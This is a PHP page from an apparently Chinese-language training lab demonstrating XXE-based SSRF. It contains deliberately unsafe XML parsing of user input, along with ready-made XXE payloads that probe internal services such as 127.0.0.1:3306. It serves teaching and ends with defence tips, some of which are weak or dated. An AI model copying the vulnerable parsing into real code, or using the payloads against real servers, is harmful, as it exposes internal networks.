<?php
// XXE SSRF利用
$module_name = 'SSRF利用';
$module_icon = '🌐';
$module_desc = '通过XXE漏洞进行SSRF攻击，访问内部网络资源。';

// 漏洞代码
$result = '';
$error = '';

if (isset($_POST['xml'])) {
    $xml = $_POST['xml'];
    
    // 漏洞：使用simplexml_load_string解析XML，没有禁用外部实体
    try {
        $simplexml = simplexml_load_string($xml);
        if ($simplexml) {
            $result = 'XML解析成功：' . htmlspecialchars(print_r($simplexml, true));
        } else {
            $error = 'XML解析失败';
        }
    } catch (Exception $e) {
        $error = '解析错误：' . $e->getMessage();
    }
}

// 页面内容
$content = '<div class="card">
        <div class="card-header">
            <h5 class="mb-0">🌐 XXE SSRF利用</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-danger">
                <strong>💡 漏洞说明：</strong><br>
                本场景演示XXE SSRF利用漏洞。<br>
                攻击者可以通过XXE漏洞发起SSRF攻击，访问内部网络资源，探测内网服务和端口。
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_POST["xml"])) {
    $xml = $_POST["xml"];
    
    // 漏洞：使用simplexml_load_string解析XML，没有禁用外部实体
    $simplexml = simplexml_load_string($xml);
    if ($simplexml) {
        $result = "XML解析成功：" . print_r($simplexml, true);
    } else {
        $error = "XML解析失败";
    }
}
</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击演示</h6>
                </div>
                <div class="card-body">
                    <p class="mb-3">本场景演示XXE SSRF利用漏洞，尝试以下攻击：</p>

                    <h5 class="mb-2">1. 访问外部网站</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "https://www.example.com"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>

                    <h5 class="mb-2 mt-4">2. 访问内部服务</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "http://127.0.0.1:80"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>

                    <h5 class="mb-2 mt-4">3. 探测内网端口</h5>
                    <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "http://127.0.0.1:3306"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>💻 实际测试</h6>
                </div>
                <div class="card-body">
                    <form method="POST" class="mb-3">
                        <div class="mb-3">
                            <label for="xml" class="form-label">XML内容</label>
                            <textarea name="xml" id="xml" class="form-control" rows="8" placeholder="输入XML内容">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [
    &lt;!ENTITY xxe SYSTEM "http://127.0.0.1"&gt;
]&gt;
&lt;root&gt;
    &lt;name&gt;&amp;xxe;&lt;/name&gt;
&lt;/root&gt;</textarea>
                        </div>
                        <button type="submit" class="btn btn-danger">提交</button>
                    </form>

                    ';

if ($error) {
    $content .= '<div class="alert alert-danger">
                        <strong>错误：</strong>
                        <p>' . htmlspecialchars($error) . '</p>
                    </div>';
}

if ($result) {
    $content .= '<div class="alert alert-secondary">
                        <strong>解析结果：</strong>
                        <pre class="mb-0 mt-2"><code>' . htmlspecialchars($result) . '</code></pre>
                    </div>';
}

$content .= '                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li><strong>禁用外部实体：</strong>在XML解析时禁用外部实体</li>
                        <li><strong>使用libxml_disable_entity_loader：</strong>在PHP中使用libxml_disable_entity_loader(true)</li>
                        <li><strong>网络隔离：</strong>实施网络分段，限制服务器的网络访问范围</li>
                        <li><strong>输入验证：</strong>对XML输入进行严格的验证</li>
                        <li><strong>使用CDATA：</strong>对于用户输入，使用CDATA包裹</li>
                        <li><strong>更新依赖：</strong>确保使用最新版本的XML解析库</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>';

// 包含模板
include '../template/module_template.php';
?>